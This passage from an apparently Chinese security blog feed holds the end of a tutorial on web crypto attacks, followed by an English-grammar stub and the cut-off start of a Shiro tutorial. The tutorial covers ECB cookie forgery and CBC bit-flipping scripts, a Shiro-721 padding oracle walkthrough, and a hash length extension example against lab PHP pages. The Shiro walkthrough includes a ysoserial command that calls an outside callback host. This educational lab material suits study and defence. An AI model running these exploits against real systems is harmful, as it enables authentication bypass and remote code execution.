       <span class="keyword">echo</span> <span class="string">'Flag is flag&#123;this is flag&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>解题思路：<br>以administrator权限登陆就就能获得Flag。判断权限则是根据cookie里面的uid参数，cookie包含username和uid两个参数，均为使用ECB加密的密文，然而username的密文是根据注册时的明文生成的</p><p>因此我们可以根据username的明文操纵生成我们想要的uid的密文。经过fuzz发现明文分组块为16个字节，那么我们注册17字节的用户，多出的那一个字节就可以是我们我们希望的UID的值，而此时我们查看username的密文增加部分就是UID的密文，即可伪造UID。</p><p>注册aaaaaaaaaaaaaaaa1获得1的密文分组,注册aaaaaaaaaaaaaaaa2获得2的密文分组，以此类推<br>exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import urllib</span><br><span class="line">import urllib2</span><br><span class="line">import base64</span><br><span class="line">import cookielib</span><br><span class="line">import Cookie</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> range(1,50):</span><br><span class="line">    reg_url=<span class="string">'http://127.0.0.1/ecb.php?a=reg'</span></span><br><span class="line">    index_url=<span class="string">'http://127.0.0.1/ecb.php'</span></span><br><span class="line">    cookie=cookielib.CookieJar()</span><br><span class="line">    opener=urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))</span><br><span class="line">    opener.addheaders.append((<span class="string">'User-Agent'</span>,<span class="string">'Mozilla/5.0'</span>))</span><br><span class="line">    num=str(num)</span><br><span class="line">    values=&#123;<span class="string">'username'</span>:<span class="string">'aaaaaaaaaaaaaaaa'</span>+num,<span class="string">'password'</span>:<span class="string">'123'</span>&#125;</span><br><span class="line">    data=urllib.urlencode(values)</span><br><span class="line">    opener.open(reg_url,data)</span><br><span class="line">    text=opener.open(index_url,data)</span><br><span class="line">    <span class="keyword">for</span> ck <span class="keyword">in</span> cookie:</span><br><span class="line">        <span class="keyword">if</span> ck.name==<span class="string">'username'</span>:</span><br><span class="line">            user_name=ck.value</span><br><span class="line">    user_name = urllib.unquote(user_name)</span><br><span class="line">    user_name = base64.b64decode(user_name)</span><br><span class="line">    hex_name = user_name.encode(<span class="string">'hex'</span>)</span><br><span class="line">    hex_name = hex_name[len(hex_name)/2:]</span><br><span class="line">    hex_name = hex_name.decode(<span class="string">'hex'</span>)</span><br><span class="line">    uid = base64.b64encode(hex_name)</span><br><span class="line">    uid = urllib.quote(uid)</span><br><span class="line">    <span class="keyword">for</span> ck <span class="keyword">in</span> cookie:</span><br><span class="line">        <span class="keyword">if</span> ck.name==<span class="string">'uid'</span>:</span><br><span class="line">            ck.value=uid</span><br><span class="line">    text=opener.open(index_url).<span class="built_in">read</span>()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'Flag'</span> <span class="keyword">in</span> text:</span><br><span class="line">        <span class="built_in">print</span> text</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">       <span class="built_in">print</span> num</span><br></pre></td></tr></table></figure><h2 id="0x2-2CBC模式攻击"><a href="#0x2-2CBC模式攻击" class="headerlink" title="0x2.2CBC模式攻击"></a>0x2.2CBC模式攻击</h2><h3 id="0x2-2-1CBC-字节翻转攻击"><a href="#0x2-2-1CBC-字节翻转攻击" class="headerlink" title="0x2.2.1CBC 字节翻转攻击"></a>0x2.2.1CBC 字节翻转攻击</h3><p>因为CBC模式是将前一个密文分组和明文分组进行混合加密,所以是可以避免ECB模式的弱点。</p><p>但正因为如此，导致解密时修改前一个密文分组就可以操纵后一个的解密后的明文分组，可以将前一个密文中的任意比特进行修改（0,1进行互换，也可以叫翻转）</p><p>因此CBC模式有两个攻击点：</p><ul><li>iv向量，影响第一个明文分组</li><li>第n个密文分组，影响第n+1个明文分组</li></ul><p>密文通过block cipher encryption解密，得到中间密文，中间密文与IV(或前一个密文区块)异或后得到的是明文，因此可以通过攻击IV，来改变最终的明文。 </p><p>IV的值该如何修改？可以简单的推理一下。<br>解密过程中，因为中间密文 ^ 原始IV = 原始明文 ，所以中间密文=原始IV^原始明文。我们想要的伪造明文=中间密文^伪造IV = 原始IV^原始明文^伪造IV，可以推出伪造IV=原始IV^原始明文^伪造明文。随意我们只要知道原始IV和原始明文这两个值，就可以伪造解密后的结果。 </p><p>举例：<br>密文1[4]的意思是密文1字符串第4个字节，相当于数组下标。<br>设：密文1[4] = A，中间密文2[4] = B，明文2[4] = C<br>因为A ^ B = C，根据结论有B = A ^ C<br>当人为修改A=A ^ C时，那么A ^ B = A ^ C ^ B = B ^ B = 0，这样明文2[4]的结果就为0了<br>当人为修改A=A ^ C ^ x (x为任意数值)时，那么<br>A ^ B = A ^ C ^ x ^ B = B ^ B ^ x = x，这是明文2[4] = x，这样就达到了控制明文某个字节的目的了。    </p><p>例题：<br>cbc.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line">$iv = <span class="string">'NGY0MWVlOGE2MGU4NTkxMQ=='</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span><span class="params">($str,$key,$iv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> openssl_decrypt(base64_decode($str),<span class="string">"AES-128-CBC"</span>,$key,OPENSSL_RAW_DATA,base64_decode($iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($str,$key,$iv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> base64_encode(openssl_encrypt($str,<span class="string">"AES-128-CBC"</span>,$key,OPENSSL_RAW_DATA, base64_decode($iv)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">'iv'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(decode($_COOKIE[<span class="string">'username'</span>],$key,$_COOKIE[<span class="string">'iv'</span>]) === <span class="string">"admin"</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"hello admin&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $flag.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(decode($_COOKIE[<span class="string">'username'</span>],$key,$_COOKIE[<span class="string">'iv'</span>]) === <span class="string">"guest"</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"hello guest&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"iv or username error"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $enc = encode(<span class="string">"guest"</span>,$key,$iv);</span><br><span class="line">    setcookie(<span class="string">'username'</span>,$enc);</span><br><span class="line">    setcookie(<span class="string">'iv'</span>,$iv);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$key = <span class="string">"8bd54bcfe6a23fc0"</span>;</span><br><span class="line">$flag = <span class="string">"flag&#123;this_is_flag&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>解题思路:   </p><p>可以得到IV值和原本明文 “guest”,从源码中知，只要伪造明文 “admin”,即可得到flag，计算伪造IV值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">iv = base64.b64decode(<span class="string">'NGY0MWVlOGE2MGU4NTkxMQ=='</span>)</span><br><span class="line">admin = <span class="string">'admin'</span> + <span class="string">'\x0b'</span>*<span class="number">11</span></span><br><span class="line">guest = <span class="string">'guest'</span> + <span class="string">'\x0b'</span>*<span class="number">11</span></span><br><span class="line">new_iv = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(admin)):</span><br><span class="line">    new_iv += chr(ord(iv[i]) ^ ord(admin[i]) ^ ord(guest[i]))</span><br><span class="line"><span class="keyword">print</span> base64.b64encode(new_iv)</span><br><span class="line"><span class="comment"># Mnc8K39lOGE2MGU4NTkxMQ==</span></span><br></pre></td></tr></table></figure><p><img src="../../images/cipher/web1/12.jpg" alt=""></p><h3 id="0x2-2-2CBC-Padding-Oracle-攻击"><a href="#0x2-2-2CBC-Padding-Oracle-攻击" class="headerlink" title="0x2.2.2CBC Padding Oracle 攻击"></a>0x2.2.2CBC Padding Oracle 攻击</h3><p>分组密码Block Cipher需要在加载前确保每个每组的长度都是分组长度的整数倍。一般情况下，明文的最后一个分组很有可能会出现长度不足分组的长度:<br><img src="../../images/cipher/web1/13.jpg" alt=""><br>这个时候，普遍的做法是PKCS#5标准中定义的规则，在最后一个分组后填充一个固定的值，这个值的大小为填充的字节总数。即假如最后还差3个字符，则填充3个0×03<br><img src="../../images/cipher/web1/14.jpg" alt=""></p><p>因为填充发生在最后一个分组，所以我们主要关注最后一个分组<br><img src="../../images/cipher/web1/15.jpg" alt=""><br>在Padding Oracle Attack攻击中，攻击者输入的参数是IV和Cipher，要通过对IV的”穷举”来请求服务器端对指定的Cipher进行解密，并对返回的结果进行判断,猜解出正确的中间密文，得到中间密文后，就可以伪造IV来伪造明文。<br>比如在web应用中，如果Padding不正确，则应用程序很可能会返回500的错误(程序执行错误)；如果Padding正确，但解密出来的内容不正确，则可能会返回200的自定义错误(这只是业务上的规定)，所以，这种区别就可以成为一个二值逻辑的”注入点”。<br>详情可看此文章：<a href="https://www.freebuf.com/articles/web/15504.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/15504.html</a>       </p><p>利用条件： </p><ol><li>攻击者知道密文和初始向量IV</li><li>padding错误和padding正确服务器可返回不一样的状态   </li></ol><p>以Shiro padding oracle 为例：    </p><p>Shiro的 RememberMe 使用 AES-128-CBC 模式加密，容易受到 Padding Oracle 攻击，AES 的初始化向量 IV 就是cookie的 rememberMe base64 解码后的前16个字。</p><p>Shrio要有Oracle Padding漏洞，有填充提示</p><ul><li>接受正确的密文（填充正确包含合法值），应用程序返回HTTP 200</li><li>接受非法的密文（解密后填充不正确），应用程序返回HTTP 500，返回框架错误页面</li><li>接受合法的密文（填充正确，值不合法），应用程序显示自定义错误HTTP 200，但是有返回自定义错误页面</li></ul><p>实际上不是原本的请求，都不满足第一条，所以只要填充正确和填充不正确返回不同就可以了。</p><p>漏洞环境搭建 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/3ndz/Shiro-721.git</span><br><span class="line"><span class="built_in">cd</span> Shiro-721/Docker</span><br><span class="line">docker build -t shiro-721 .</span><br><span class="line">docker run -p 8080:8080 -d shiro-721</span><br></pre></td></tr></table></figure><p>1.登录 Shiro 测试账户获取合法 Cookie（勾选Remember Me）<br><img src="../../images/cipher/web1/16.jpg" alt=""><br>2.生成java payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsBeanutils1 <span class="string">"ping awa4xw.ceye.io"</span> &gt; payload.class</span><br></pre></td></tr></table></figure><p>3.执行exp，经过了几十分钟的爆破，得到padding oracle attack后的cookie</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 shiro_exp.py http://192.168.247.130:8080/ NqoZZVVnFvBxH0m7tavNPhx2H2mPLucccvcuM3WSSIQIWyksw3xnNG70MWsSy+TFCUZEkiQSdV38fTmfJgsuEJPFLUrVQUwDkZ+disZ5k1auCE2swMsLE7cUxDykdPk79k6Q0k6N8rZpszd/1+F6uoA8PDH9zaYt7RwXUS2z+JKFV30Cl7h0zZvlKYK98DrITFX8sW0Z/veIgh6G3ljIAIo6CgRUKMwYsi1dfD+HeE5qxTpofOfyuUnkguzY//gvEahmxWy85qMBgSchENUn+aKOFWnrtEvTQ3bOhN3T5Lb2zz0waCSpFEyC+tBDYxUWiiANjJnkUf/KtOZ/tQheAjZezmBymL5qOQJPMaVuGyQtX7AGIhn3r3wrLdQsCog4NzCM5EcaNV4zuGEXL4Mfnk0xh7Lv4O04c931gCRM6zv5hB743NwjdO72hc1TcC/CYLRjfs5rUWHerNClnBJhw5h+pQuJdZ0qsv95aC0Qeh4ywpQKELPfpbuZNEd1zt75 payload.class</span><br></pre></td></tr></table></figure><p><img src="../../images/cipher/web1/17.jpg" alt=""><br>4.复制该cookie，然后重放一下数据库，即可成功执行命令<br><img src="../../images/cipher/web1/18.jpg" alt=""><br><img src="../../images/cipher/web1/19.jpg" alt=""></p><h2 id="0x2-3Hash长度扩展攻击"><a href="#0x2-3Hash长度扩展攻击" class="headerlink" title="0x2.3Hash长度扩展攻击"></a>0x2.3Hash长度扩展攻击</h2><p>Hash长度扩展攻击可以在知道HASH(message(salt+data))的hash值得情况下，算出HASH(message+padding+a)的hash值，就是根据短的消息的hash算出更长的消息的hash。<br>利用条件：  </p><ol><li>知道salt的长度</li><li>要知道一个由salt加密后的hash值</li><li>知道data的值(未加盐的明文)</li></ol><p>例题：  </p><p>hash.php </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"secret.php"</span>;</span><br><span class="line">@$username=(string)$_POST[<span class="string">'username'</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enc</span><span class="params">($text)</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $key;</span><br><span class="line">    <span class="keyword">return</span> md5($key.$text);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(enc($username) === $_COOKIE[<span class="string">'verify'</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_numeric(strpos($username, <span class="string">"admin"</span>)))&#123;</span><br><span class="line">        <span class="keyword">die</span>($flag);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"you are not admin"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    setcookie(<span class="string">"verify"</span>, enc(<span class="string">"guest"</span>), time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">7</span>);</span><br><span class="line">    setcookie(<span class="string">"len"</span>, strlen($key), time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">7</span>);</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>secret.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$key=<span class="string">'123456789qwertyuiopasdfghjklzxcvbnm12345671475'</span>;</span><br><span class="line">$flag=<span class="string">'flag&#123;this_1s_a_f1ag&#125;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>解题思路：<br>可以得到enc(“guest”)的值 ,$key的长度为46,要求我们输入的username在经过enc函数加密之后，与<code>$_COOKIE[‘verify’]</code>的值相等，并且username中必须含有admin。</p><p>使用hashdump工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/bwall/HashPump</span><br><span class="line">apt-get install g++ libssl-dev</span><br><span class="line"><span class="built_in">cd</span> HashPump</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>用法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input Signature: 已知的<span class="built_in">hash</span>值，这里是<span class="variable">$_COOKIE</span>[<span class="string">'verify'</span>]的值</span><br><span class="line">Input Data: 上面的<span class="built_in">hash</span>值解密后的字符串，这里是guest。</span><br><span class="line">Input Key Length: <span class="variable">$key</span>的长度</span><br><span class="line">Input Data to Add: 想要添加的数据，由于题目要求要含有admin，所以这里是admin。</span><br></pre></td></tr></table></figure><p><img src="../../images/cipher/web1/20.jpg" alt=""><br>然后我们将得到的hash值去替换数据包中<code>$_COOKIE[‘verify’]</code>的值，然后post提交<br>username=guest%80%00%00%00%00%98%01%00%00%00%00%00%00admin即可。<br><img src="../../images/cipher/web1/21.jpg" alt=""> </p><h1 id="0x3-总结"><a href="#0x3-总结" class="headerlink" title="0x3 总结"></a>0x3 总结</h1><p>这里简单介绍了常见的WEB密码学攻击方式，如有错误的地方欢迎指正。</p><p>参考链接：<br><a href="https://ciphersaw.me/2017/11/12/Hash%20Length%20Extension%20Attack%EF%BC%88%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%EF%BC%89/" target="_blank" rel="noopener">https://ciphersaw.me/2017/11/12/Hash%20Length%20Extension%20Attack%EF%BC%88%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%EF%BC%89/</a><br><a href="https://www.anquanke.com/post/id/84724" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84724</a><br><a href="https://www.freebuf.com/articles/web/15504.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/15504.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ECB、CBC分组模式攻击方式和Hash长度扩展攻击&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>英语语法学习</title>
    <link href="https://blog.cfyqy.com/article/81c4e30a.html"/>
    <id>https://blog.cfyqy.com/article/81c4e30a.html</id>
    <published>2021-02-28T03:54:34.000Z</published>
    <updated>2021-02-28T03:56:41.705Z</updated>
    
    <content type="html"><![CDATA[<p>语法学习，还是要提升一下英语啦！</p><a id="more"></a><h1 id="初级语法"><a href="#初级语法" class="headerlink" title="初级语法"></a>初级语法</h1><p><img src="../../images/other/english/1.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;语法学习，还是要提升一下英语啦！&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>shiro简单学习</title>
    <link href="https://blog.cfyqy.com/article/35357a3b.html"/>
    <id>https://blog.cfyqy.com/article/35357a3b.html</id>
    <published>2021-02-26T02:00:44.000Z</published>
    <updated>2021-02-27T03:51:41.287Z</updated>
    
    <content type="html"><![CDATA[<p>shiro学习</p><a id="more"></a><p>慕课视频：<a href="https://www.imooc.com/video/16952" target="_blank" rel="noopener">https://www.imooc.com/video/16952</a><br><img src="../../images/java/shirolearning/1.jpg" alt=""></p><h1 id="Shiro认证，授权，自定义Realm"><a href="#Shiro认证，授权，自定义Realm" class="headerlink" title="Shiro认证，授权，自定义Realm"></a>Shiro认证，授权，自定义Realm</h1><h2 id="Shiro认证"><a href="#Shiro认证" class="headerlink" title="Shiro认证"></a>Shiro认证</h2><p><img src="../../images/java/shirolearning/2.jpg" alt=""><br>pom.xml</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span><br><span class="line">&lt;project xmlns=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span><br><span class="line">         xmlns:xsi=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span><br><span class="line">         xsi:schemaLocation=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span><br><span class="line">    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">    &lt;groupId&gt;com.ye1s&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;ye1s-shrio&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;shiro-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.4.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;junit&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;junit&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;4.12&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.slf4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.7.30&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.slf4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;slf4j-simple&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.7.5&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure><p>AuthenticationTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.shiro.SecurityUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.UsernamePasswordToken;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.mgt.DefaultSecurityManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.realm.SimpleAccountRealm;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.Subject;</span><br><span class="line"><span class="keyword">import</span> org.junit.Before;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AuthenticationTest</span> </span>&#123;</span><br><span class="line">    SimpleAccountRealm simpleAccountRealm=<span class="keyword">new</span> SimpleAccountRealm();</span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addUser</span><span class="params">()</span></span>&#123;</span><br><span class="line">        simpleAccountRealm.addAccount(<span class="string">"admin"</span>,<span class="string">"password"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testAuthentication</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//构建SecurityManager环境</span></span><br><span class="line">        DefaultSecurityManager defaultSecurityManager=<span class="keyword">new</span> DefaultSecurityManager();</span><br><span class="line">        defaultSecurityManager.setRealm(simpleAccountRealm);</span><br><span class="line"></span><br><span class="line">         <span class="comment">//提交主题认证请求</span></span><br><span class="line">        SecurityUtils.setSecurityManager(defaultSecurityManager);</span><br><span class="line">        Subject subject=SecurityUtils.getSubject();</span><br><span class="line"></span><br><span class="line">        UsernamePasswordToken usernamePasswordToken=<span class="keyword">new</span> UsernamePasswordToken(<span class="string">"admin"</span>,<span class="string">"password"</span>);</span><br><span class="line"></span><br><span class="line">        subject.login(usernamePasswordToken);</span><br><span class="line">        System.out.println(<span class="string">"isAuthenticated is:"</span> +subject.isAuthenticated());</span><br><span class="line">        subject.logout();</span><br><span class="line">        System.out.println(<span class="string">"isAuthenticated is:"</span> +subject.isAuthenticated());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">result:</span></span><br><span class="line"><span class="comment">isAuthenticated is:true</span></span><br><span class="line"><span class="comment">isAuthenticated is:false</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h2 id="Shrio授权"><a href="#Shrio授权" class="headerlink" title="Shrio授权"></a>Shrio授权</h2><p><img src="../../images/java/shirolearning/3.jpg" alt=""></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 